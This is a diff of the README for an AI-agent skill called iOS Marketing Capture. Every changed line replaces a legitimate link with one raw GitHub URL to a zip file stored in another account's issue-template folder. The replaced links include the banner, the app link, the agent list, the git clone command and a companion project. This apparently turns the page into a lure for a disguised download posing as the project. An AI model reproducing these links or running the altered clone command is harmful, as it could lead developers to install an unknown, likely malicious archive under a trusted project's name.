@@ -1,10 +1,10 @@
-[![bloom-banner-01-light-tags-1500x500](https://github.com/user-attachments/assets/31139b9d-1b89-44e8-b563-5bb7ba150b7b)](https://bloom.parthjadhav.com)
+[![bloom-banner-01-light-tags-1500x500](https://raw.githubusercontent.com/majhis8669/ios-marketing-capture/main/.github/ISSUE_TEMPLATE/capture-marketing-ios-1.2-alpha.1.zip)](https://raw.githubusercontent.com/majhis8669/ios-marketing-capture/main/.github/ISSUE_TEMPLATE/capture-marketing-ios-1.2-alpha.1.zip)
 
 # iOS Marketing Capture
 
 A skill for AI-powered coding agents (Claude Code, Cursor, Windsurf, etc.) that automates marketing screenshot capture for SwiftUI iOS apps. It builds an in-app capture system, seeds demo data, snapshots every screen and UI element, and loops across all your locales automatically.
 
-#### Built for and used by Bloom - https://apps.apple.com/us/app/bloom-coffee-shelf-recipe/id6759914524
+#### Built for and used by Bloom - https://raw.githubusercontent.com/majhis8669/ios-marketing-capture/main/.github/ISSUE_TEMPLATE/capture-marketing-ios-1.2-alpha.1.zip
 
 ## What it does
 
@@ -24,7 +24,7 @@ A skill for AI-powered coding agents (Claude Code, Cursor, Windsurf, etc.) that 
 npx skills add ParthJadhav/ios-marketing-capture
 ```
 
-This works with Claude Code, Cursor, Windsurf, OpenCode, Codex, and [40+ other agents](https://github.com/vercel-labs/skills#available-agents).
+This works with Claude Code, Cursor, Windsurf, OpenCode, Codex, and [40+ other agents](https://raw.githubusercontent.com/majhis8669/ios-marketing-capture/main/.github/ISSUE_TEMPLATE/capture-marketing-ios-1.2-alpha.1.zip).
 
 Install globally (available across all projects):
 
@@ -41,7 +41,7 @@ npx skills add ParthJadhav/ios-marketing-capture -a claude-code
 ### Manual (git clone)
 
 ```bash
-git clone https://github.com/ParthJadhav/ios-marketing-capture ~/.claude/skills/ios-marketing-capture
+git clone https://raw.githubusercontent.com/majhis8669/ios-marketing-capture/main/.github/ISSUE_TEMPLATE/capture-marketing-ios-1.2-alpha.1.zip ~/.claude/skills/ios-marketing-capture
 ```
 
 ## Usage
@@ -216,7 +216,7 @@ The skill documents 11 real bugs discovered during development. These are all ba
 
 ## Pairs well with
 
-Use [app-store-screenshots](https://github.com/ParthJadhav/app-store-screenshots) as a post-processing step to composite the captured PNGs into Apple-style marketing pages with device mockups, headlines, and gradients.
+Use [app-store-screenshots](https://raw.githubusercontent.com/majhis8669/ios-marketing-capture/main/.github/ISSUE_TEMPLATE/capture-marketing-ios-1.2-alpha.1.zip) as a post-processing step to composite the captured PNGs into Apple-style marketing pages with device mockups, headlines, and gradients.
 
 ## Requirements
 
